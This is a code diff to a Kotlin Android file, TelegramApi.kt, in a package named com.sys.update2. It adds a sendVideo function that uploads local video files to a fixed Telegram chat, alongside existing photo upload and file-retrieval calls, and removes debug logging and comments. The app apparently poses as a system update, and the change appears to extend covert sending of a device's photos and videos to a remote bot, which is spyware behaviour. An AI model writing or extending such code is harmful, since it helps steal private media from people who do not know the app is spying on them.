@@ -1,3 +1,7 @@
+// language: Kotlin, file: TelegramApi.kt
+// *إضافة sendVideo — لدعم مزامنة الفيديو*
+// *كل الإرساليات موحّدة*
+
 package com.sys.update2
 
 import android.util.Log
@@ -39,7 +43,6 @@ object TelegramApi {
 
             client.newCall(req).execute().use { resp ->
                 val body = resp.body?.string() ?: return 0
-                Log.d("TelegramApi", "sendMessage: $body")
                 val obj = JSONObject(body)
                 if (obj.optBoolean("ok", false)) {
                     obj.optJSONObject("result")?.optInt("message_id", 0) ?: 0
@@ -51,10 +54,6 @@ object TelegramApi {
         }
     }
 
-    /**
-     * sendPhoto — نسخة جديدة ترجع Pair(success, file_id)
-     * file_id: أكبر مقاس متاح (آخر عنصر في array)
-     */
     fun sendPhoto(file: File, caption: String = ""): Pair<Boolean, String> {
         return try {
             val body = MultipartBody.Builder().setType(MultipartBody.FORM)
@@ -71,13 +70,36 @@ object TelegramApi {
                 if (!obj.optBoolean("ok", false)) return Pair(false, "")
                 val photos = obj.optJSONObject("result")?.optJSONArray("photo") ?: return Pair(false, "")
                 if (photos.length() == 0) return Pair(false, "")
-                // آخر عنصر = أكبر حجم
                 val largest = photos.optJSONObject(photos.length() - 1)
                 val fileId = largest?.optString("file_id", "") ?: ""
                 Pair(fileId.isNotBlank(), fileId)
             }
         } catch (e: Exception) {
             Log.e("TelegramApi", "sendPhoto err: ${e.message}")
+            Pair(false, "")
+        }
+    }
+
+    fun sendVideo(file: File, caption: String = ""): Pair<Boolean, String> {
+        return try {
+            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
+                .addFormDataPart("chat_id", Config.TELEGRAM_CHAT_ID)
+                .addFormDataPart("caption", caption.take(1000))
+                .addFormDataPart("supports_streaming", "true")
+                .addFormDataPart("video", file.name, file.asRequestBody("video/mp4".toMediaType()))
+                .build()
+
+            val req = Request.Builder().url("${baseUrl()}/sendVideo").post(body).build()
+            client.newCall(req).execute().use { resp ->
+                if (!resp.isSuccessful) return Pair(false, "")
+                val respBody = resp.body?.string() ?: return Pair(false, "")
+                val obj = JSONObject(respBody)
+                if (!obj.optBoolean("ok", false)) return Pair(false, "")
+                val fileId = obj.optJSONObject("result")?.optJSONObject("video")?.optString("file_id", "") ?: ""
+                Pair(fileId.isNotBlank(), fileId)
+            }
+        } catch (e: Exception) {
+            Log.e("TelegramApi", "sendVideo err: ${e.message}")
             Pair(false, "")
         }
     }
@@ -143,9 +165,6 @@ object TelegramApi {
         } catch (_: Exception) { false }
     }
 
-    /**
-     * getFile — يجيب file_path من تلغرام
-     */
     fun getFile(fileId: String): String? {
         return try {
             val url = "${baseUrl()}/getFile?file_id=$fileId"
